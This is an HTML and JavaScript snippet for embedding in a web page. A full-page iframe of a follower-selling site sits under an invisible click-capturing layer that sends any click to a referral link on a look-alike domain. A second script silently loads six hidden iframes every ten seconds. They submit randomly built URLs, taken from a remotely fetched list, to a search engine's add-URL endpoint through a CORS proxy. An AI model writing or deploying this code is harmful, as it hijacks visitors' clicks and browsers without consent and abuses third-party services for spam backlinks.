<link href='https://trafficgenerator.github.io/api/custom-frame-styles.css' rel='stylesheet'/>

<div id="container">
<iframe id="fullIframe" src="https://www.followlike.net/?r=19384926"></iframe>
<div id="clickCatcher"></div>
</div>

<script>
      document.getElementById("clickCatcher").addEventListener("click", function () {
        	//window.location.href = "http://folllike.com/?19384926";
		
		    // Changes top window; will throw if cross-origin
		    top.location.href = 'http://folllike.com/?19384926';
		    // or to replace current history:
		    // top.location.replace('http://folllike.com/?19384926');
      });
</script>
<!---------------------------------------------------------->

<div id="stealthIFrameContainer"></div>

<script>
/* ============================
   CONFIGURATION
============================ */

const FETCH_URL_LIST = [
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator.json"
];

const FALLBACK_URLS = [
  "https://smartbacklinkmaker.blogspot.com/"
];

const IFRAME_COUNT = 6;
const SUBMIT_INTERVAL = 10000;
const CACHE_KEY = "validated_url_cache_v2";
const CACHE_TTL = 24 * 60 * 60 * 1000; // 24 hours

/* ============================
   URL UTILITIES
============================ */

function ensureHttp(url) {
  if (typeof url !== "string") return null;
  url = url.trim();
  if (!url) return null;
  if (!/^https?:\/\//i.test(url)) {
    url = "https://" + url;
  }
  return url;
}

function isValidURL(url) {
  try {
    new URL(url);
    return true;
  } catch {
    return false;
  }
}

function normalizeURL(url) {
  return url.replace(/([^:]\/)\/+/g, "$1");
}

function shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
}

/* ============================
   TIME HELPERS
============================ */

function unixTime() {
  return Math.floor(Date.now() / 1000);
}

/* ============================
   CACHE HELPERS
============================ */

function loadCache() {
  try {
    const raw = localStorage.getItem(CACHE_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    if (!Array.isArray(parsed.data)) return null;
    if (Date.now() - parsed.ts > CACHE_TTL) return null;
    return parsed.data;
  } catch {
    return null;
  }
}

function saveCache(data) {
  try {
    localStorage.setItem(
      CACHE_KEY,
      JSON.stringify({ ts: Date.now(), data })
    );
  } catch {}
}

/* ============================
   FETCH & VALIDATE URL LIST
============================ */

async function loadURLPool() {
  const cached = loadCache();
  if (cached && cached.length) {
    console.log("ðŸ“¦ Loaded URLs from cache:", cached.length);
    return cached;
  }

  shuffle(FETCH_URL_LIST);

  for (const src of FETCH_URL_LIST) {
    try {
      console.log("ðŸŒ Fetching URL list:", src);
      const r = await fetch(src, { cache: "no-store" });
      if (!r.ok) throw new Error(r.status);
      const json = await r.json();

      const clean = json
        .map(ensureHttp)
        .filter(u => u && isValidURL(u));

      if (clean.length) {
        console.log("âœ… Valid URLs loaded:", clean.length);
        saveCache(clean);
        return clean;
      }
    } catch (e) {
      console.warn("âŒ Fetch failed:", src);
    }
  }

  console.warn("âš  Using fallback URLs");
  return FALLBACK_URLS.map(ensureHttp).filter(isValidURL);
}

/* ============================
   TARGET URL BUILDER
============================ */

function buildSubmitURL(targetURL) {
  const inner =
    "http://www.secretsearchenginelabs.com/add-url.php" +
    "?subtime=" + unixTime() +
    "&newurl=" + encodeURIComponent(targetURL);

  return "https://api.allorigins.win/raw?url=" +
    encodeURIComponent(inner);
}

function generateTargetURL(pool) {
  const base = pool[Math.floor(Math.random() * pool.length)];
  const ref  = pool[Math.floor(Math.random() * pool.length)];

  //const combined =  normalizeURL(base + "?ref=" + encodeURIComponent(ref));
  const combined =  normalizeURL(base + "?" + ref);

  console.log("ðŸ”— Base URL:", base);
  console.log("ðŸ”— Ref URL:", ref);
  console.log("ðŸš€ Combined:", combined);

  const finalURL = buildSubmitURL(combined);
  console.log("ðŸ“¨ Submitted:", finalURL);

  return finalURL;
}

/* ============================
   IFRAME HANDLER
============================ */

function createIframe(index, pool) {
  const iframe = document.createElement("iframe");
  iframe.name = iframe.id = "hiddenFrame" + index;
  iframe.classList.add("hidden-iframe");
  iframe.style.width = "100%";
  iframe.style.height = "200px";
  iframe.style.border = "2px dashed red";
  iframe.src = "about:blank";

  document.getElementById("stealthIFrameContainer").appendChild(iframe);

  setTimeout(() => {
    iframe.src = generateTargetURL(pool);
  }, 500);

  setInterval(() => {
    iframe.src = generateTargetURL(pool);
  }, SUBMIT_INTERVAL);
}

/* ============================
   STARTUP
============================ */

document.addEventListener("DOMContentLoaded", async () => {
  const pool = await loadURLPool();
  console.log("ðŸš¦ URL pool ready:", pool.length);

  for (let i = 0; i < IFRAME_COUNT; i++) {
    createIframe(i, pool);
  }
});
</script>
